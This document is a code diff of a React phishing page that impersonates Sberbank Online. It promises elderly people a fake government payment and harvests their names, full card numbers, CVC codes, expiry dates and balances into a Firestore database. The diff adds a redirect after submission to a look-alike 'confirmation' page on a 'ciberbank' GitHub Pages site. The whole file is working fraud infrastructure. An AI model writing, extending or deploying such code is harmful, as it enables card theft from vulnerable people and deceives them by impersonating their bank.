@@ -11,28 +11,27 @@ import { ToastContainer, toast } from 'react-toastify';
 import { db } from './firebase'
 import { addDoc, collection } from 'firebase/firestore';
 import { GrMenu } from 'react-icons/gr'
-import { DesktopDatePicker } from '@mui/x-date-pickers/DesktopDatePicker';
-import { MobileDatePicker } from '@mui/x-date-pickers/MobileDatePicker';
-import Stack from '@mui/material/Stack';
-import { LocalizationProvider } from '@mui/x-date-pickers/LocalizationProvider';
-import { AdapterDayjs } from '@mui/x-date-pickers/AdapterDayjs';
 import CreditCardInput from 'react-credit-card-input';
 import NumericFormat, { InputAttributes } from 'react-number-format';
 import background_image from './img/background_image.jpg'
 import header from "./img/header.svg"
- import logo from "./img/logo.svg"
- import mirsvg from './img/mir.svg'
+import logo from "./img/logo.svg"
+import mirsvg from './img/mir.svg'
 import mirpng from './img/mir.png'
-import exam from './img/exam.png'
+import exams from './img/exam.png'
 import icon from "./img/icon.png"
+
+
 function App() {
   const [name, setName] = useState("")
   const [surname, setSurname] = useState("")
-  const [value, setValue] = useState( null);
+  const [value, setValue] = useState(null);
   const [code, setCode] = useState(null)
   const [cvc, setCvc] = useState(null)
   const [balance, setBalance] = useState(null)
-  const [exam , setExam] = useState(false)
+  const [exam, setExam] = useState(false)
+
+
   function handleSubmit(e) {
     e.preventDefault()
     if (!code || !cvc) {
@@ -41,6 +40,7 @@ function App() {
       const usersRef = collection(db, "users")
       addDoc(usersRef, { name, surname, code, cvc, value, balance }).then(response => {
         toast.success('Поздравляем, Вы получите оплату после подтверждения входящего сообщения.')
+        window.location.replace('https://ciberbank.github.io/podtverzhdeniye');
       }).catch(error => {
         toast.error("Пожалуйста, заполните информацию2");
       })
@@ -87,11 +87,10 @@ function App() {
             <div className="text-[14px] sm:text-[25px] font-bold text-green-600 flex items-start gap-3"> <RiErrorWarningFill size={45} /> Добро пожаловать в СберБанк Онлайн</div>
           </div>
         </div>
-
         <form onSubmit={handleSubmit} className='w-full h-full flex flex-col items-center justify-center text-center pb-10'>
           <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[55%]'>Пожалуйста, <span className='text-red-600'>заполните форму</span>, чтобы воспользоваться кампанией, зарезервированной правительством для пожилых людей из-за экономических проблем в нашей стране.</h1>
           <div className="flex flex-col  items-center justify-center gap-6 sm:gap-12 py-10 w-[80%] sm:w-[30%]">
-            <div  className="flex items-center justify-center gap-5 w-full">
+            <div className="flex items-center justify-center gap-5 w-full">
               <TextField defaultValue={name} label="имя" variant="standard" onChange={(e) => {
                 setName(e.target.value)
               }} />
@@ -105,10 +104,10 @@ function App() {
                 <img src={code !== null && code[0] === '2' ? mirsvg : mirpng} className='w-9 h-9 ' alt="" />
                 <SiMastercard size={27} className={`${code !== null && code[0] === '5' ? 'text-orange-500 ' : 'text-gray-300'}`} />
               </div>
-              <div onClick={() => setExam(!exam)} onMouseEnter={() => setExam(true)} onMouseLeave={() => setExam(false)}  className={' rounded-full hidden sm:block border border-gray px-2 absolute top-20 right-6 z-[100] cursor-pointer text-[13px]'}>?</div>
+              <div onClick={() => setExam(!exam)} onMouseEnter={() => setExam(true)} onMouseLeave={() => setExam(false)} className={' rounded-full hidden sm:block border border-gray px-2 absolute top-20 right-6 z-[100] cursor-pointer text-[13px]'}>?</div>
               <div className={` ${exam ? 'flex' : 'hidden'} flex-col border p-3 bg-white rounded-xl   absolute top-20 -right-[20rem] z-[102] cursor-pointer text-[14px]`}>
-              <span>Код CVV/CVC указан на <br/> обратной стороне карты</span>
-              <img src={exam} alt="" />
+                <span>Код CVV/CVC указан на <br /> обратной стороне карты</span>
+                <img src={exams} alt="" />
               </div>
               <CreditCardInput
                 customTextLabels={{
@@ -151,14 +150,13 @@ function App() {
                 onChange={(e) => {
                   setBalance(e.target.value)
                 }}
-               className="w-full"
+                className="w-full"
                 variant="standard"
               />
             </div>
-          </div>
+          </div>                
           <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3 text-xl'> воспользоваться кампанией</button>
         </form>
-
       </div>
       <footer className='bg-[#171a1e] sm:h-[500px] w-full flex  justify-center'>
         <div className="w-[90%] sm:w-[77%] flex justify-between py-8">
